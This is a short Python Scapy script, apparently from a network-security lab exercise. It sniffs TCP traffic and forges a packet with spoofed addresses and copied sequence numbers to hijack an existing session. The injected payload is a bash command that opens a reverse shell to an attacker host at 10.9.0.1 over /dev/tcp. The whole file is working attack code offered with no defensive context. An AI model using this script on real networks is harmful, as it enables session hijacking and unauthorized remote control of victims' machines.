from scapy.all import *

victim_ip = '10.9.0.5'
attack_ip = '10.9.0.1'
# PSH = 0x08
# ACK = 0x010

def hijack_rev_shell(pkt):
    if pkt[IP].src != victim_ip and pkt[TCP].flags == 0x010:
        ip = IP(src = pkt[IP].src, dst = pkt[IP].dst)
        tcp = TCP(sport = pkt[TCP].sport, 
                  dport = pkt[TCP].dport,
                  seq = pkt[TCP].seq,
                  ack = pkt[TCP].ack,
                  flags = 0x18)
        data = b'\r' + b'/bin/bash -i > /dev/tcp/' + attack_ip.encode() + b'/999 0<&1 2>&1' + b'\r'
        new_pkt = ip/tcp/data
        new_pkt.show()
        send(new_pkt)
        print('\033[1;49;36m[+]  Reverse Shell attack successfully!\033[0m')
        sys.exit()

interf = 'br-d6b258aef2ee'
f = 'tcp'
pkt = sniff(iface= interf, filter=f, prn=hijack_rev_shell)